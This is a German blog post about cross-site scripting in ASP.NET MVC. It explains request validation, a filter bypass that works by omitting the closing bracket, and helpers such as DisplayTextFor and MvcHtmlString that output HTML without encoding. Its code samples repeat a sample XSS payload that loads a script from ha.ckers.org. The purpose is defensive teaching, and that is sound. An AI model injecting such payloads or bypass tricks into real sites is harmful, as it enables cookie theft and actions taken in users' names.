---
layout: post
title: "XSS in ASP.NET MVC–RequestValidation, Html.DisplayFor & MvcHtmlString"
date: 2012-04-03 21:39
author: robert.muehsig
comments: true
categories: [Allgemein, HowTo]
tags: [ASP.NET MVC, XSS]
language: de
---
{% include JB/setup %}
<p>Was der Benutzer eingibt ist böse. Die Chance, dass ein “böser” Nutzer Javascript in die eigene Anwendung einschleusen möchte ist verdammt hoch. Diese Art der Angriffe nennt man “<a href="http://de.wikipedia.org/wiki/Cross-Site-Scripting">Cross-Site-Scripting</a>”.</p> <p><strong>Kurzeinführung XSS</strong></p> <p>Ziel des Angreifers ist es, bösen Schad-Code in das System zu bringen, mit dem Ziel andere Nutzer auszuspähen oder Aktionen in ihrem Namen zu machen. Schafft es z.B. ein Angreifer ein Javascript Schnipsel in das System zu schleusen, könnten nun die privaten Cookie-Daten eines anderen Nutzers abgegriffen werden oder per Javascript werden ungewollte Aktionen ausgelöst.</p> <p>Wunderbare Beispiele findet man auf dieser Seite: <a href="http://ha.ckers.org/xss.html">http://ha.ckers.org/xss.html</a>. Unser Ziel ist es also, die Eingabe als auch die Ausgabe “sicher” zu machen.</p> <p><strong>Browser sind blöd</strong></p> <p>Input-Validierung ist nicht trivial. Wer denkt, dass man einfach nach öffnenden und schließenden Tags ausschau halten muss, wird überrascht sein wie kreativ Browser die falschen Tags dennoch interpretieren!</p> <p><u>Beispiel eines bösen Schadcodes</u></p> <div style="padding-bottom: 0px; margin: 0px; padding-left: 0px; padding-right: 0px; display: inline; float: none; padding-top: 0px" id="scid:812469c5-0cb0-4c63-8c15-c81123a09de7:4ee3c5d4-ddd5-49d1-9638-469091626b45" class="wlWriterEditableSmartContent"><pre name="code" class="c#">"&lt;SCRIPT/XSS SRC=\"htpp://ha.ckers.org/css.js\"&gt;</pre></div>
<p>Trotz dessen, dass “SCRIPT/XSS” ohnehin kein richtiger Tag ist und “htpp” auch nicht korrekt ist, versucht der Browser trotzdem die böse Javascript Datei zu laden.</p>
<p>Selbst wenn das schließende Tag nicht vorhanden ist, wird das Javascript versucht zu laden. Hier gibt es noch ganz viele <a href="http://ha.ckers.org/xss.html">tolle Beispiele</a>.</p>
<p><strong>Eingaben-Validierung: Request Validation von ASP.NET – nicht anfassen!</strong></p>
<p>ASP.NET ist in dieser Hinsicht recht “robust”, wenn nicht sogar sehr genau. Sobald ein öffnendes oder schließendes Tag gefunden wird, gibt es eine Security Exception:</p>
<p><em>“A potentially dangerous Request.QueryString value was detected from the client (searchTerm="&lt;foobar").”</em></p>
<p><a href="{{BASE_PATH}}/assets/wp-images/image1497.png"><img style="background-image: none; border-bottom: 0px; border-left: 0px; padding-left: 0px; padding-right: 0px; display: inline; border-top: 0px; border-right: 0px; padding-top: 0px" title="image" border="0" alt="image" src="{{BASE_PATH}}/assets/wp-images/image_thumb668.png" width="622" height="161"></a></p>
<p>Die Request Validation <a href="http://www.uniquesoftware.de/Blog/de/post/2012/02/06/Request-Validation-an-eigene-Bedurfnisse-anpassen.aspx">kann man anpassen</a>, allerdings reisst die Variante von Martin ungewollt löcher in die Applikation, weil die AntiXSS Library nicht genau hinschaut. Wenn der Angreifer anstatt “&lt;script src=”…”&gt; das schließende “<strong>&gt;</strong>” weg lässt, erkennt die Library den Schadcode nicht. XSS, hello!</p>
<p><strong>Empfehlung:</strong> Finger davon lassen. Nur wenn man ganz genau weiß, was man da macht, kann man sich daran wagen. Wer z.B. bei Passwörtern die Zeichen “<strong>&gt;</strong>” und “<strong>&lt;</strong>” zulassen möchte, der kommt mit dem <a href="http://msdn.microsoft.com/en-us/library/system.web.mvc.allowhtmlattribute(v=vs.98).aspx">AllowHtml</a> Attribut weiter. Bei anderen Fällen muss man enorm aufpassen!</p>
<p><strong>Ausgabe absichern</strong></p>
<p>Ausgaben sollten Prinzipell Html-Encoded sein. Alles andere ist gefährlich!</p>
<p><strong>Html.DisplayFor – KEIN HTML ENCODING!</strong></p>
<p>Folgender Code von mir (der Code stammt aus <a href="http://stackoverflow.com/questions/9790557/does-the-standard-html-displaytextfor-no-html-encoding">einer Frage</a>, welche ich bei Stackoverflow gestellt habe).</p>
<p>Szenario: Böser Schadcode ist im System und wird nun zum View geschickt. 
<div style="padding-bottom: 0px; margin: 0px; padding-left: 0px; padding-right: 0px; display: inline; float: none; padding-top: 0px" id="scid:812469c5-0cb0-4c63-8c15-c81123a09de7:ee7f54df-e4fc-4699-b814-553383d535f1" class="wlWriterEditableSmartContent"><pre name="code" class="c#">public class HomeController : Controller
{
    public ActionResult Index()
    {
        ViewBag.Message = "&lt;SCRIPT/XSS SRC=\"htpp://ha.ckers.org/css.js\"&gt;";

        User foo = new User();
        foo.Name = "&lt;SCRIPT/XSS SRC=\"htpp://ha.ckers.org/css.js\"&gt;";

        return View(bla);
    }

    public ActionResult About()
    {
        return View();
    }
}

public class User
{
    public string Name { get; set; }
} 
</pre></div></p>
<p>&nbsp;</p>

<p>Nun zur Ausgabe – das Ergebnis steht bereits da (und hat mich jedenfalls überrascht)</p>
<div style="padding-bottom: 0px; margin: 0px; padding-left: 0px; padding-right: 0px; display: inline; float: none; padding-top: 0px" id="scid:812469c5-0cb0-4c63-8c15-c81123a09de7:b50e1d07-d5dc-4134-a115-075483414ff5" class="wlWriterEditableSmartContent"><pre name="code" class="c#">The View:

@Html.TextBoxFor(m =&gt; m.Name) &lt;br/&gt; ||| &lt;-- will be encoded

@Html.Encode(ViewBag.Message)&lt;br/&gt; ||| &lt;-- will be double encoded

@Model.Name &lt;br/&gt; ||| &lt;-- will be encoded 

@Html.DisplayTextFor(m =&gt; m.Name) &lt;-- no encoding
&lt;br/&gt; ||| </pre></div>
<p>&nbsp;</p>
<p>Wer “DisplayTextFor” nutzt, sollte also wissen, was er tut und es vorher über Html.Encode absichern. Oder einfach nur den Razor @Syntax nehmen – der macht es immer.</p>
<p><strong>MvcHtmlStrings? Machen die nicht ein encoding?</strong></p>
<p>Mit MVC3 wurden auch die MvcHtmlStrings eingeführt, allerdings darf man nicht denken, dass diese per Default alles encoden:</p>
<div style="padding-bottom: 0px; margin: 0px; padding-left: 0px; padding-right: 0px; display: inline; float: none; padding-top: 0px" id="scid:812469c5-0cb0-4c63-8c15-c81123a09de7:47340e02-3821-4236-b0ee-98bdb9e41a80" class="wlWriterEditableSmartContent"><pre name="code" class="c#">var mvcHtmlString = MvcHtmlString.Create("&lt;SCRIPT/XSS SRC=\"htpp://ha.ckers.org/css.js\"&gt;").ToHtmlString();

    var encoded = HttpUtility.HtmlEncode("&lt;SCRIPT/XSS SRC=\"htpp://ha.ckers.org/css.js\"&gt;");</pre></div>
<p>&nbsp;</p>
<p>Wenn ich beides nun ausgebe wird der mvcHtmlString ohne HtmlEncoding dargestellt. ToHtmlString macht keine encoding!</p>
<p>Erst durch das HtmlEncode wird es sicher! Näheres gibt es in dieser <a href="http://stackoverflow.com/questions/9802144/mvchtmlstring-tohtmlstring-not-encoding-html">Stackoverflow Frage</a>.</p>
<p><strong>Nutzereingaben sind gefährlich! Browser lassen viel durchgehen, daher doppelt wachsam sein!</strong></p>
<p>XSS Attacken sind sehr verbreitet. ASP.NET ist nicht mehr oder weniger anfällig für XSS, man muss allerdings das Framework zu nutzen wissen.</p>
